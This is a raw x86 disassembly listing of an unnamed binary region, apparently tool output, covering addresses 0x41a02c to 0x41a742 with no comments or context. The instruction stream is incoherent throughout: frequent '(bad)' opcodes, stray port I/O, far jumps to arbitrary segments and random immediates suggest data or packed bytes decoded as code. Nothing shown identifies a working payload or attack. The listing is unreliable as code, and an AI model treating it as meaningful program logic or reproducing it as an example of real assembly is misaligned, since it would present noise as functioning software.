  41a02c:	adc    al,0x3a
  41a02e:	push   esi
  41a02f:	mov    edi,0x9d31587b
  41a034:	out    0xba,eax
  41a036:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a037:	fadd   DWORD PTR [eax+0x5d]
  41a03a:	sbb    DWORD PTR [esi],esp
  41a03c:	ret    
  41a03d:	(bad)  
  41a03e:	xor    BYTE PTR [eax],bl
  41a040:	push   ebp
  41a041:	shl    DWORD PTR [ebp-0x411a4b05],0x4d
  41a048:	int    0x2f
  41a04a:	xchg   ebp,eax
  41a04b:	ror    DWORD PTR [eax-0x79ae20ac],0x4f
  41a052:	popf   
  41a053:	(bad)  
  41a054:	sahf   
  41a055:	pop    ecx
  41a056:	xor    edx,DWORD PTR [ebx-0x7]
  41a059:	dec    ebx
  41a05a:	mov    ah,BYTE PTR [ebx+0x10812fb4]
  41a060:	push   cs
  41a061:	js     0x419fff
  41a063:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a064:	mov    BYTE PTR [ebp+0x72],dh
  41a067:	mov    ecx,0xe2a1a486
  41a06c:	sub    DWORD PTR [eax+0x34],edi
  41a06f:	mov    bh,0xd
  41a071:	pop    eax
  41a072:	test   eax,0xfef4fe35
  41a077:	cmp    esi,DWORD PTR [edx+0x25383636]
  41a07d:	sub    DWORD PTR [esp+esi*1],0x2c4b652
  41a084:	jno    0x41a04e
  41a086:	das    
  41a087:	fsub   DWORD PTR ds:0x3f648cb8
  41a08d:	aam    0xec
  41a08f:	leave  
  41a090:	add    ebp,DWORD PTR [ebx-0x2a]
  41a093:	push   ecx
  41a094:	pop    es
  41a095:	or     ebx,edx
  41a097:	jb     0x41a078
  41a099:	jp     0x41a06c
  41a09b:	addr16 popa 
  41a09d:	xlat   BYTE PTR ds:[ebx]
  41a09e:	or     edx,DWORD PTR [ecx]
  41a0a0:	inc    edx
  41a0a1:	in     eax,dx
  41a0a2:	add    BYTE PTR [edi-0x1860cc08],ch
  41a0a8:	xor    edi,esp
  41a0aa:	call   0xbd1d:0x798e48b9
  41a0b1:	jb     0x41a0c6
  41a0b3:	rcl    BYTE PTR [ecx-0x19],0xf7
  41a0b7:	pop    eax
  41a0b8:	xchg   esp,eax
  41a0b9:	jbe    0x41a040
  41a0bb:	fdivr  DWORD PTR [eax+eiz*8+0x70120f3e]
  41a0c2:	or     eax,ebp
  41a0c4:	push   0xffc7d265
  41a0c9:	fs int 0xf9
  41a0cc:	sbb    BYTE PTR [esi+0x15],bl
  41a0cf:	mov    eax,0xb5198c9
  41a0d4:	xchg   edi,eax
  41a0d5:	das    
  41a0d6:	popa   
  41a0d7:	xor    DWORD PTR [eax+0x5],ebx
  41a0da:	mov    edi,0xee709c10
  41a0df:	ja     0x41a13f
  41a0e1:	cmc    
  41a0e2:	jp     0x41a150
  41a0e4:	inc    edi
  41a0e5:	enter  0x1717,0x6e
  41a0e9:	xchg   edx,eax
  41a0ea:	loopne 0x41a153
  41a0ec:	rol    DWORD PTR [ebx+edi*8],0x62
  41a0f0:	test   DWORD PTR [edi+0x42],ebx
  41a0f3:	std    
  41a0f4:	jae    0x41a0f7
  41a0f6:	lahf   
  41a0f7:	add    al,0x6e
  41a0f9:	push   es
  41a0fa:	push   ebx
  41a0fb:	pop    ebp
  41a0fc:	ret    
  41a0fd:	adc    BYTE PTR [ebx-0x3],dl
  41a100:	push   esp
  41a101:	cld    
  41a102:	mov    ebp,0xaeffc818
  41a107:	mov    ah,0xd9
  41a109:	(bad)  
  41a10a:	cs pop ecx
  41a10c:	ds jge 0x41a10c
  41a10f:	into   
  41a110:	inc    esi
  41a111:	adc    DWORD PTR [edi-0x22b25c38],eax
  41a117:	repnz push 0x1a
  41a11a:	mov    al,0xcd
  41a11c:	imul   ecx,DWORD PTR [edi+0x3870ed8b],0xc
  41a123:	lds    ebp,FWORD PTR [edx+0x694f22b0]
  41a129:	mov    eax,ds:0xf22ed0d4
  41a12e:	call   0xba28be35
  41a133:	lods   al,BYTE PTR ds:[esi]
  41a134:	mov    bh,0xb5
  41a136:	push   ebx
  41a137:	aaa    
  41a138:	aaa    
  41a139:	sar    cl,cl
  41a13b:	jg     0x41a182
  41a13d:	xchg   ecx,eax
  41a13e:	cmc    
  41a13f:	(bad)  
  41a140:	and    eax,0xd5ee95e4
  41a145:	push   esp
  41a146:	adc    DWORD PTR [ebp+0x15],esp
  41a149:	or     eax,0xa0dca8
  41a14e:	and    esp,esp
  41a150:	push   es
  41a151:	jmp    0x41a17d
  41a153:	mov    eax,ds:0xfbab6da3
  41a158:	(bad)  
  41a159:	mov    esi,0x73035572
  41a15e:	sub    DWORD PTR [edi],esi
  41a160:	and    al,0xeb
  41a162:	pop    edi
  41a163:	div    DWORD PTR [edi]
  41a165:	ja     0x41a1b0
  41a167:	es xchg ebp,eax
  41a169:	xor    ch,al
  41a16b:	pop    esp
  41a16c:	clc    
  41a16d:	adc    BYTE PTR [ecx+eax*2-0x260a6c95],bl
  41a174:	fwait
  41a175:	loope  0x41a112
  41a177:	mov    al,0x3e
  41a179:	call   0x77e8ac2
  41a17e:	jle    0x41a167
  41a180:	mov    ebp,0x3cff5158
  41a185:	pusha  
  41a186:	(bad)  
  41a187:	or     eax,DWORD PTR [ebp+0x74605512]
  41a18d:	fmul   QWORD PTR fs:[esi+ebp*1-0x5e]
  41a192:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a193:	fisubr WORD PTR [ebx]
  41a195:	nop
  41a196:	aad    0xa8
  41a198:	xchg   ecx,eax
  41a199:	mov    ch,0x6
  41a19b:	add    al,0x88
  41a19d:	dec    eax
  41a19e:	neg    BYTE PTR [ebx+eax*8-0x7ed74e13]
  41a1a5:	mov    al,0xa2
  41a1a7:	add    al,0xfa
  41a1a9:	jp     0x41a1f2
  41a1ab:	jmp    0xdf01:0xb30ff396
  41a1b2:	and    ebx,DWORD PTR [ebx-0x36225b53]
  41a1b8:	push   eax
  41a1b9:	aad    0x2c
  41a1bb:	jmp    0x44e4:0xa0c04631
  41a1c2:	jbe    0x41a218
  41a1c4:	out    dx,eax
  41a1c5:	ja     0x41a22d
  41a1c7:	pop    edx
  41a1c8:	mov    ebx,DWORD PTR [eax]
  41a1ca:	mov    ah,0x37
  41a1cc:	lods   eax,DWORD PTR ds:[esi]
  41a1cd:	xor    dl,BYTE PTR [eax-0xbeeba8e]
  41a1d3:	scas   al,BYTE PTR es:[edi]
  41a1d4:	or     al,BYTE PTR [edx]
  41a1d6:	out    dx,eax
  41a1d7:	stc    
  41a1d8:	bound  esp,QWORD PTR [edx-0x722ed0d1]
  41a1de:	shr    BYTE PTR [edx-0x76],cl
  41a1e1:	or     BYTE PTR [edx+0x4fdda926],al
  41a1e7:	jmp    0xc86e6c44
  41a1ec:	out    dx,al
  41a1ed:	or     edi,edx
  41a1ef:	xchg   edx,eax
  41a1f0:	(bad)  
  41a1f1:	sub    ecx,DWORD PTR [edx]
  41a1f3:	fmul   QWORD PTR [ebx]
  41a1f5:	cmp    al,0x76
  41a1f7:	pop    esi
  41a1f8:	xlat   BYTE PTR ds:[ebx]
  41a1f9:	mov    ah,0x7f
  41a1fb:	push   esp
  41a1fc:	les    esp,FWORD PTR [ebx]
  41a1fe:	stos   DWORD PTR es:[edi],eax
  41a1ff:	inc    esi
  41a200:	stos   BYTE PTR es:[edi],al
  41a201:	aam    0xc0
  41a203:	or     bl,0x75
  41a206:	adc    DWORD PTR [edx-0x46],ecx
  41a209:	xchg   bl,dl
  41a20b:	xor    eax,0xee44f8f5
  41a210:	sub    DWORD PTR [esi-0x78265d6f],edx
  41a216:	ret    0xeed4
  41a219:	jge    0x41a238
  41a21b:	loopne 0x41a24f
  41a21d:	imul   esp,eax,0x26
  41a220:	lods   eax,DWORD PTR ds:[esi]
  41a221:	pop    ebx
  41a222:	inc    esi
  41a223:	pop    es
  41a224:	sbb    DWORD PTR [ecx+0x31a1671e],ebx
  41a22a:	lea    edx,[esi+0xf]
  41a22d:	sbb    BYTE PTR [eax],al
  41a22f:	inc    edx
  41a230:	pop    ebx
  41a231:	cli    
  41a232:	loopne 0x41a20b
  41a234:	and    ebx,0xffffffb6
  41a237:	adc    al,0x3c
  41a239:	iret   
  41a23a:	add    dh,ch
  41a23c:	pop    es
  41a23d:	xor    eax,0x77890139
  41a242:	nop
  41a243:	fisub  DWORD PTR [eax-0x11]
  41a246:	jne    0x41a24d
  41a248:	(bad)  
  41a249:	clc    
  41a24a:	scas   eax,DWORD PTR es:[edi]
  41a24b:	jnp    0x41a2c8
  41a24d:	adc    eax,0x7bdcccfd
  41a252:	sbb    eax,DWORD PTR [esi-0x5a3ffea6]
  41a258:	add    ebx,esp
  41a25a:	into   
  41a25b:	cmp    dl,BYTE PTR [esi-0x68e3b2e2]
  41a261:	aaa    
  41a262:	shr    BYTE PTR [esi],1
  41a264:	sbb    bl,BYTE PTR [edx]
  41a266:	mov    cl,0x2b
  41a268:	je     0x41a283
  41a26a:	cmp    dl,BYTE PTR [esi-0x8]
  41a26d:	cwde   
  41a26e:	cmc    
  41a26f:	push   ss
  41a270:	cmc    
  41a271:	or     ecx,ebx
  41a273:	jns    0x41a294
  41a275:	xchg   esp,eax
  41a276:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a278:	add    edx,esi
  41a27a:	clc    
  41a27b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a27c:	cs jecxz 0x41a239
  41a27f:	xor    DWORD PTR [edi],edi
  41a281:	jb     0x41a235
  41a283:	and    al,0xd6
  41a285:	push   cs
  41a286:	adc    eax,0xf0b38221
  41a28b:	cmp    ah,BYTE PTR [edx]
  41a28d:	int    0xe8
  41a28f:	das    
  41a290:	jne    0x41a2ba
  41a292:	mov    ebp,0x466411fc
  41a297:	push   ss
  41a298:	add    al,0x48
  41a29a:	loope  0x41a30d
  41a29c:	or     dl,dl
  41a29e:	pusha  
  41a29f:	adc    BYTE PTR [esi],ch
  41a2a1:	xor    BYTE PTR [edi],0x53
  41a2a4:	push   esi
  41a2a5:	ja     0x41a2fb
  41a2a7:	jno    0x41a2f3
  41a2a9:	arpl   WORD PTR [ecx-0x28],dx
  41a2ac:	mov    eax,ds:0x901660fb
  41a2b1:	mov    ?,WORD PTR [edi+0x7b2e77b]
  41a2b7:	dec    ecx
  41a2b8:	cmp    DWORD PTR [esi-0x6d],ecx
  41a2bb:	stos   BYTE PTR es:[edi],al
  41a2bc:	sbb    al,0x52
  41a2be:	xchg   esp,eax
  41a2bf:	in     eax,dx
  41a2c0:	outs   dx,BYTE PTR ds:[esi]
  41a2c1:	mov    ebp,0x3b109562
  41a2c6:	and    eax,0x79857a6c
  41a2cb:	retf   0x2381
  41a2ce:	mov    ebp,0xef48f540
  41a2d3:	dec    ebp
  41a2d4:	and    cl,BYTE PTR [edx+0x67349675]
  41a2da:	test   DWORD PTR [eax+edx*4+0x45e9b83f],ecx
  41a2e1:	mov    esp,0x692a932c
  41a2e6:	add    DWORD PTR [ebp+0x3daefc69],eax
  41a2ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2ed:	stos   DWORD PTR es:[edi],eax
  41a2ee:	cdq    
  41a2ef:	push   edx
  41a2f0:	shl    BYTE PTR [edi+0x63],cl
  41a2f3:	mov    dh,al
  41a2f5:	(bad)  [esi+0x455e721e]
  41a2fb:	std    
  41a2fc:	(bad)  
  41a2fe:	cmp    DWORD PTR [edi+ecx*4+0x4458d713],ecx
  41a305:	push   0xb
  41a307:	je     0x41a2ca
  41a309:	loop   0x41a377
  41a30b:	sbb    al,0xcf
  41a30d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a30e:	xor    al,0x36
  41a310:	dec    edi
  41a311:	pop    esp
  41a312:	repnz clc 
  41a314:	cld    
  41a315:	add    eax,0xc31111dd
  41a31a:	xchg   esp,eax
  41a31b:	pop    esi
  41a31c:	adc    eax,0x3ef227fd
  41a321:	lods   al,BYTE PTR gs:[esi]
  41a323:	lds    ecx,FWORD PTR [edi-0x1a]
  41a326:	arpl   cx,bx
  41a328:	cmp    DWORD PTR [esi-0x73],eax
  41a32b:	pop    edx
  41a32c:	jns    0x41a2d5
  41a32e:	sub    BYTE PTR [esp+edx*1-0x59e2a5b3],bh
  41a335:	das    
  41a336:	pop    ss
  41a337:	jo     0x41a2c7
  41a339:	cmc    
  41a33a:	loop   0x41a2d2
  41a33c:	push   ecx
  41a33d:	mov    dh,0x7
  41a33f:	pop    ecx
  41a340:	xor    eax,0xc1bfc37c
  41a345:	sbb    esi,DWORD PTR [edx+0x74]
  41a348:	nop
  41a349:	lods   eax,DWORD PTR ds:[esi]
  41a34a:	ins    DWORD PTR es:[edi],dx
  41a34b:	jb     0x41a3b6
  41a34d:	cmp    al,0xe5
  41a34f:	aas    
  41a350:	fadd   DWORD PTR [ecx+0x361ccd59]
  41a356:	cld    
  41a357:	add    DWORD PTR [ebp+0x635e5fd1],edi
  41a35d:	ss mov ebp,0x7b205770
  41a363:	xchg   edi,eax
  41a364:	fbld   TBYTE PTR [edx+0x56d92b80]
  41a36a:	ins    DWORD PTR es:[edi],dx
  41a36b:	int3   
  41a36c:	mov    ch,ch
  41a36e:	push   0x4e
  41a370:	jo     0x41a3ec
  41a372:	dec    ebp
  41a373:	jns    0x41a314
  41a375:	hlt    
  41a376:	push   edx
  41a377:	jp     0x41a37e
  41a379:	inc    edx
  41a37a:	mov    bl,0x47
  41a37c:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41a37e:	cwde   
  41a37f:	push   esi
  41a380:	sbb    edx,ecx
  41a382:	push   esi
  41a383:	aam    0xd4
  41a385:	inc    eax
  41a386:	jno    0x41a3cf
  41a388:	clc    
  41a389:	div    ch
  41a38b:	js     0x41a367
  41a38d:	or     ah,BYTE PTR [edx]
  41a38f:	(bad)  
  41a390:	arpl   cx,bp
  41a392:	mov    ch,0x3b
  41a394:	dec    ebx
  41a395:	mov    cl,0x6c
  41a397:	stc    
  41a398:	sub    DWORD PTR [ebx],ecx
  41a39a:	jae    0x41a3ed
  41a39c:	xchg   esi,eax
  41a39d:	xor    ch,cl
  41a39f:	sti    
  41a3a0:	gs xor dh,0x39
  41a3a4:	adc    bl,cl
  41a3a6:	inc    edi
  41a3a7:	xchg   DWORD PTR [edi],eax
  41a3a9:	repnz (bad) 
  41a3ab:	push   ecx
  41a3ac:	jl     0x41a3de
  41a3ae:	in     al,0x9b
  41a3b0:	mov    cl,0xd5
  41a3b2:	jmp    0x1445:0xd9bffd4c
  41a3b9:	adc    al,0xab
  41a3bb:	add    eax,eax
  41a3bd:	or     al,al
  41a3bf:	cmc    
  41a3c0:	pop    es
  41a3c1:	xchg   DWORD PTR [edi],ebx
  41a3c3:	cs out 0x81,al
  41a3c6:	sahf   
  41a3c7:	ins    DWORD PTR es:[edi],dx
  41a3c8:	cmp    dl,BYTE PTR [edi-0x68ac71be]
  41a3ce:	ss cld 
  41a3d0:	sbb    al,0x1a
  41a3d2:	mov    esp,0x85fce653
  41a3d7:	pop    esp
  41a3d8:	fwait
  41a3d9:	repz sbb eax,0x535b3d96
  41a3df:	pop    ds
  41a3e0:	ins    BYTE PTR es:[edi],dx
  41a3e1:	in     eax,0x94
  41a3e3:	mov    ch,0x89
  41a3e5:	test   al,0x1b
  41a3e7:	aaa    
  41a3e8:	rcr    DWORD PTR [edx-0x1a658cb4],0x7f
  41a3ef:	jmp    0x316c:0x8e62f16b
  41a3f6:	mov    ds:0x94eda0fd,al
  41a3fb:	xchg   esp,eax
  41a3fc:	sar    BYTE PTR [edx-0x1d],cl
  41a3ff:	cmp    esp,edx
  41a401:	mov    eax,ds:0x83ba6165
  41a406:	inc    ebp
  41a407:	pop    ebp
  41a408:	xacquire xchg BYTE PTR [esi],ah
  41a40b:	(bad)  
  41a40c:	int3   
  41a40d:	scas   al,BYTE PTR es:[edi]
  41a40e:	(bad)  
  41a40f:	clc    
  41a410:	inc    ebx
  41a411:	aaa    
  41a412:	jb     0x41a3c5
  41a414:	call   DWORD PTR [eax+0x61b5a2f0]
  41a41a:	inc    ebx
  41a41b:	call   0xeea9:0xc7d3055f
  41a422:	push   cs
  41a423:	add    al,0x6
  41a425:	pop    ebx
  41a426:	clc    
  41a427:	jb     0x41a3b3
  41a429:	fld    TBYTE PTR [ebx+edx*2+0x43cd2667]
  41a430:	xchg   edi,eax
  41a431:	es sub al,0x1a
  41a434:	sbb    eax,0x57cd92b1
  41a439:	fstp   DWORD PTR [eax-0x1e]
  41a43c:	adc    esp,DWORD PTR [esi*4+0x5c1db3ac]
  41a443:	mov    edx,DWORD PTR [ebx+ebp*4+0x84f8085]
  41a44a:	cmp    BYTE PTR [edi],bl
  41a44c:	pop    ecx
  41a44d:	(bad)  
  41a44e:	jb     0x41a3d9
  41a450:	pop    ebp
  41a451:	stc    
  41a452:	pop    ecx
  41a453:	(bad)  
  41a454:	cmp    edx,DWORD PTR [edi+esi*2]
  41a457:	add    BYTE PTR [eax+eax*1+0x10],dl
  41a45b:	int    0xf3
  41a45d:	xchg   ecx,eax
  41a45e:	adc    ebp,DWORD PTR [ecx]
  41a460:	mov    cl,0xd0
  41a462:	int    0x3c
  41a464:	call   0x71e5bb58
  41a469:	outs   dx,BYTE PTR ds:[esi]
  41a46a:	adc    eax,0xeeabf345
  41a46f:	mov    ecx,0x8ad73156
  41a474:	sbb    dl,BYTE PTR [edx+ecx*2+0x3b]
  41a478:	dec    edi
  41a479:	ret    
  41a47a:	ja     0x41a4af
  41a47c:	fsubr  QWORD PTR [eax]
  41a47e:	dec    edi
  41a47f:	mov    edx,DWORD PTR [ecx+0x731204b5]
  41a485:	loope  0x41a463
  41a487:	in     eax,0x49
  41a489:	aas    
  41a48a:	dec    ecx
  41a48b:	dec    edi
  41a48c:	jge    0x41a4ec
  41a48e:	cmp    esp,edx
  41a490:	cli    
  41a491:	addr16 jle 0x41a511
  41a494:	dec    ecx
  41a495:	dec    ecx
  41a496:	shr    esi,cl
  41a498:	xchg   ebx,eax
  41a499:	mov    ds:0xb3e171a0,eax
  41a49e:	stos   DWORD PTR es:[edi],eax
  41a49f:	outs   dx,BYTE PTR ds:[esi]
  41a4a0:	fdiv   DWORD PTR [edi-0x1]
  41a4a3:	lds    esp,FWORD PTR [eax]
  41a4a5:	inc    eax
  41a4a6:	mov    eax,ds:0x4df03fca
  41a4ab:	dec    edx
  41a4ac:	ins    BYTE PTR es:[edi],dx
  41a4ad:	outs   dx,DWORD PTR ds:[esi]
  41a4ae:	icebp  
  41a4af:	jl     0x41a525
  41a4b1:	lds    ecx,FWORD PTR [ecx-0x5e17c760]
  41a4b7:	in     al,dx
  41a4b8:	loope  0x41a4c4
  41a4ba:	xchg   esi,eax
  41a4bb:	adc    eax,esp
  41a4bd:	adc    esp,esi
  41a4bf:	jl     0x41a494
  41a4c1:	mov    ah,0x0
  41a4c3:	xchg   esp,eax
  41a4c4:	mov    BYTE PTR [ebx+edx*8+0x129a8314],bl
  41a4cb:	mov    ss,WORD PTR [ecx+0x19]
  41a4ce:	add    eax,0x4398b027
  41a4d3:	pop    esi
  41a4d4:	add    al,0xc4
  41a4d6:	push   esp
  41a4d7:	mov    al,ds:0xf35fe0
  41a4dc:	mov    al,0x36
  41a4de:	jns    0x41a4c1
  41a4e0:	and    esp,DWORD PTR [esi-0x32]
  41a4e3:	and    dh,BYTE PTR ds:0x87bc12c7
  41a4e9:	xchg   BYTE PTR [edi+0x59],al
  41a4ec:	mov    ebp,0x1bb514c8
  41a4f1:	sbb    edx,DWORD PTR [ecx-0x62]
  41a4f4:	pop    edi
  41a4f5:	push   ds
  41a4f6:	retf   0x5719
  41a4f9:	imul   ebp,DWORD PTR cs:[ecx-0x43],0xffffffc7
  41a4fe:	fwait
  41a4ff:	jl     0x41a51c
  41a501:	in     eax,0x80
  41a503:	scas   al,BYTE PTR es:[edi]
  41a504:	or     eax,0x7559b148
  41a509:	xor    al,0x7a
  41a50b:	adc    al,0x85
  41a50d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a50e:	lock cmp DWORD PTR [esi],esi
  41a511:	loop   0x41a4b3
  41a513:	les    esi,FWORD PTR [esi]
  41a515:	jo     0x41a54c
  41a517:	clc    
  41a518:	out    dx,al
  41a519:	dec    edx
  41a51a:	test   al,0x2e
  41a51c:	out    dx,eax
  41a51d:	dec    esi
  41a51e:	inc    esp
  41a51f:	out    dx,al
  41a520:	sbb    al,0x58
  41a522:	dec    ebx
  41a523:	popf   
  41a524:	sbb    bl,ah
  41a526:	inc    ebp
  41a527:	mov    dl,0x1c
  41a529:	xchg   DWORD PTR [eax],esi
  41a52b:	sub    eax,0xd271671d
  41a530:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a531:	test   al,0x2a
  41a533:	into   
  41a534:	mov    cl,0x23
  41a536:	sub    cl,BYTE PTR [ebx-0x39]
  41a539:	ins    DWORD PTR es:[edi],dx
  41a53a:	imul   ecx,DWORD PTR [esi-0x4daa128b],0x7bcc1b7
  41a544:	mov    al,0x70
  41a546:	mov    cl,0x52
  41a548:	push   esp
  41a549:	clc    
  41a54a:	sbb    eax,edi
  41a54c:	sbb    dh,BYTE PTR [ebp+ebp*4-0x5b]
  41a550:	rol    esp,0xbd
  41a553:	push   ebx
  41a554:	loope  0x41a5a7
  41a556:	push   esp
  41a557:	xchg   ebx,eax
  41a558:	int3   
  41a559:	ja     0x41a532
  41a55b:	aaa    
  41a55c:	xor    DWORD PTR [eax+0x11],esi
  41a55f:	sub    ebp,esi
  41a561:	mov    gs,WORD PTR [esp+ecx*2+0x380d655e]
  41a568:	loopne 0x41a5c8
  41a56a:	ja     0x41a50a
  41a56c:	ret    0xde09
  41a56f:	or     edx,eax
  41a571:	fisub  DWORD PTR [ecx+0x70]
  41a575:	mov    BYTE PTR [ecx+0x88e5802],dh
  41a57b:	push   ecx
  41a57c:	xchg   ebx,eax
  41a57d:	sub    eax,0x99d580a3
  41a582:	mov    ebx,0x9de410f5
  41a587:	pop    es
  41a588:	mov    WORD PTR [ebx],ds
  41a58a:	ret    
  41a58b:	out    dx,eax
  41a58c:	adc    DWORD PTR [ebx],0xffffffec
  41a58f:	xor    ch,BYTE PTR [eax]
  41a591:	pop    ebx
  41a592:	cs push 0x95eae3b4
  41a598:	pop    edx
  41a599:	mov    esi,0x9766889d
  41a59e:	inc    esp
  41a59f:	inc    esi
  41a5a0:	cwde   
  41a5a1:	mov    eax,ds:0x9fbdfc15
  41a5a6:	xor    al,0x5c
  41a5a8:	push   ecx
  41a5a9:	mov    ch,0x88
  41a5ab:	fninit 
  41a5ad:	retf   
  41a5ae:	(bad)  
  41a5af:	in     eax,0xeb
  41a5b1:	mov    ?,WORD PTR [esi-0x6a]
  41a5b4:	and    DWORD PTR [edx+0x34],esp
  41a5b7:	mov    ebp,0x1d35978c
  41a5bc:	or     al,0x93
  41a5be:	mov    esp,0x58142f00
  41a5c3:	xchg   edi,eax
  41a5c4:	inc    edx
  41a5c6:	xor    BYTE PTR ds:0x5b8993b8,bl
  41a5cc:	test   BYTE PTR [edi+ecx*8+0x764bb8ef],0xeb
  41a5d4:	dec    eax
  41a5d5:	out    0x65,al
  41a5d7:	jno    0x41a564
  41a5d9:	xor    DWORD PTR [esi-0x77],edx
  41a5dc:	jge    0x41a5b3
  41a5de:	std    
  41a5df:	(bad)  
  41a5e0:	sbb    BYTE PTR [esi],bl
  41a5e2:	retf   0x5dfe
  41a5e5:	shl    DWORD PTR [eax-0x196ae472],cl
  41a5eb:	jae    0x41a5be
  41a5ed:	jge    0x41a603
  41a5ef:	ins    BYTE PTR es:[edi],dx
  41a5f0:	jne    0x41a65d
  41a5f2:	sub    edi,eax
  41a5f4:	dec    ebp
  41a5f5:	(bad)  
  41a5f6:	sbb    ebp,DWORD PTR [edi]
  41a5f8:	cld    
  41a5f9:	iret   
  41a5fa:	dec    ebp
  41a5fb:	pop    ebx
  41a5fc:	sub    al,0x9a
  41a5fe:	hlt    
  41a5ff:	test   al,0x2c
  41a601:	ja     0x41a628
  41a603:	dec    ecx
  41a604:	sub    eax,0x98015c69
  41a609:	(bad)  
  41a60a:	aad    0xc0
  41a60c:	jnp    0x41a621
  41a60e:	pusha  
  41a60f:	cli    
  41a610:	sub    al,0xc6
  41a612:	inc    esi
  41a613:	dec    esp
  41a614:	fdivrp st(4),st
  41a616:	popf   
  41a617:	mov    BYTE PTR [ebx-0x7d],dl
  41a61a:	inc    esp
  41a61b:	fisttp DWORD PTR [ecx]
  41a61d:	inc    edx
  41a61e:	idiv   edx
  41a620:	test   eax,0x30c7ca8b
  41a625:	test   al,0x8
  41a627:	jae    0x41a5ca
  41a629:	std    
  41a62a:	mov    edx,0xa2217fd1
  41a62f:	xchg   ebp,eax
  41a630:	cmp    DWORD PTR [esi],edi
  41a632:	xchg   ah,dl
  41a634:	hlt    
  41a635:	stos   BYTE PTR es:[edi],al
  41a636:	sub    al,0x31
  41a638:	add    DWORD PTR [edx+0x15],ebx
  41a63b:	ins    DWORD PTR es:[edi],dx
  41a63c:	pop    edx
  41a63d:	adc    BYTE PTR [edx],dh
  41a63f:	dec    esi
  41a640:	and    DWORD PTR [esi+0x54862d24],edx
  41a646:	scas   al,BYTE PTR es:[edi]
  41a647:	outs   dx,BYTE PTR ds:[esi]
  41a648:	lds    esi,FWORD PTR [edx+0x3c]
  41a64b:	mov    ss,edi
  41a64d:	dec    esp
  41a64e:	sub    cl,BYTE PTR [ecx+edx*1]
  41a651:	ins    BYTE PTR es:[edi],dx
  41a652:	iret   
  41a653:	ja     0x41a641
  41a655:	ss push edi
  41a657:	push   ecx
  41a658:	dec    edx
  41a659:	push   eax
  41a65a:	dec    esi
  41a65b:	arpl   WORD PTR [eax+0x17],sp
  41a65e:	retf   
  41a65f:	sbb    al,0x46
  41a661:	cdq    
  41a662:	repnz inc ecx
  41a664:	call   0x7c80e909
  41a669:	test   DWORD PTR fs:[bx],ecx
  41a66d:	ja     0x41a670
  41a66f:	int    0x20
  41a671:	mov    ch,0x78
  41a673:	call   edx
  41a675:	rol    BYTE PTR [edi],cl
  41a677:	mov    edi,0x1238d0f2
  41a67c:	push   es
  41a67d:	fmul   QWORD PTR [ebp+ebx*1-0x7d89ae8e]
  41a684:	sbb    bh,BYTE PTR [edi]
  41a686:	push   ds
  41a687:	and    bl,BYTE PTR [ebp+0x73ed7f3e]
  41a68d:	push   ebx
  41a68e:	and    edi,DWORD PTR [edx]
  41a690:	fild   WORD PTR [edx]
  41a692:	pusha  
  41a693:	adc    DWORD PTR [edi-0x3d],esp
  41a696:	cmp    al,0xae
  41a698:	mov    dl,0x31
  41a69a:	pop    ebx
  41a69b:	xor    ebx,DWORD PTR [ecx]
  41a69d:	test   DWORD PTR [ebx+0x63],edx
  41a6a0:	js     0x41a6f9
  41a6a2:	leave  
  41a6a3:	adc    al,0xbb
  41a6a5:	retf   0xccfb
  41a6a8:	test   DWORD PTR [ecx+0x15],edi
  41a6ab:	loop   0x41a728
  41a6ad:	popf   
  41a6ae:	fidiv  DWORD PTR [edi-0x29]
  41a6b1:	ss inc si
  41a6b4:	cmp    al,0xf0
  41a6b6:	sub    al,0xc0
  41a6b8:	paddusb mm0,QWORD PTR [edi+0x18]
  41a6bc:	xchg   edi,eax
  41a6bd:	jg     0x41a6bb
  41a6bf:	imul   DWORD PTR [ecx]
  41a6c1:	xor    ecx,DWORD PTR [edx-0x1d4023a0]
  41a6c7:	pop    esi
  41a6c8:	ins    DWORD PTR es:[edi],dx
  41a6c9:	(bad)  
  41a6ca:	lods   eax,DWORD PTR ds:[esi]
  41a6cb:	push   eax
  41a6cc:	sbb    BYTE PTR [edi-0x73],ah
  41a6cf:	std    
  41a6d0:	ss mov esi,0x43407596
  41a6d6:	adc    dl,BYTE PTR [ebp+0x7e]
  41a6d9:	ficomp DWORD PTR [ecx+edi*1-0x2e]
  41a6dd:	mov    al,BYTE PTR [eax-0x3b23ff3a]
  41a6e3:	scas   al,BYTE PTR es:[edi]
  41a6e4:	and    BYTE PTR [ecx-0x56],ch
  41a6e7:	jg     0x41a760
  41a6e9:	(bad)  
  41a6ea:	in     al,0xed
  41a6ec:	push   ds
  41a6ed:	dec    eax
  41a6ee:	mov    ch,0x22
  41a6f0:	push   ss
  41a6f1:	in     eax,0x1a
  41a6f3:	int3   
  41a6f4:	mov    eax,ds:0xf4bfe024
  41a6f9:	inc    esi
  41a6fa:	adc    al,0xaf
  41a6fc:	icebp  
  41a6fd:	loope  0x41a74d
  41a6ff:	xchg   ch,ah
  41a701:	vmovss xmm2,xmm5,xmm0
  41a705:	adc    ebx,0xb0457d1d
  41a70b:	dec    edx
  41a70c:	aas    
  41a70d:	gs mov dl,0xa1
  41a710:	sub    DWORD PTR [ebx+eax*4+0x73a94412],ebx
  41a717:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a718:	scas   eax,DWORD PTR es:[edi]
  41a719:	xchg   ecx,eax
  41a71a:	add    ecx,DWORD PTR [ebx+edi*4-0x44]
  41a71e:	iret   
  41a71f:	loopne 0x41a70a
  41a721:	and    BYTE PTR [ebx],bl
  41a723:	sti    
  41a724:	arpl   WORD PTR [ebp-0x1d4d6555],si
  41a72a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a72b:	sub    BYTE PTR [edi+ebx*2],0xe9
  41a72f:	add    esp,esp
  41a731:	iret   
  41a732:	xchg   ecx,eax
  41a733:	cwde   
  41a734:	pop    esi
  41a735:	retf   0x2ca6
  41a738:	jl     0x41a75a
  41a73a:	lea    eax,[edx]
  41a73c:	push   eax
  41a73d:	mov    ebx,0x29f6b549
  41a742:	std    
